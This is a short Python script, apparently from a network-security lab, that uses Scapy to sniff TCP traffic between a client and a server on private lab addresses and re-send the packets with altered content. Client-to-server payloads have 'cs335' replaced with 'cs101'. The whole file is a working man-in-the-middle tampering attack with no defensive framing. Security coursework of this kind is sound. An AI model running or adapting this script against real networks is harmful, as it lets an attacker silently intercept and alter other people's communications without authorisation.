#!/usr/bin/env python3
from scapy.all import *

client = "10.0.2.16"
server = "10.0.2.14"

def spoof_pkt(pkt):
	if pkt[IP].src == client and pkt[IP].dst == server:

		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].payload)
		del(newpkt[TCP].chksum)

		if pkt[TCP].payload:
			data = pkt[TCP].payload.load
			newdata = data.replace("cs335", "cs101")
			#print(newdata)
			send(newpkt/newdata, verbose=0)
		else:
			send(newpkt, verbose=0)
	elif pkt[IP].src == server and pkt[IP].dst == client:
		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].chksum)
		send(newpkt, verbose=0)

pkt = sniff(iface='enp0s3', filter='tcp', prn=spoof_pkt)
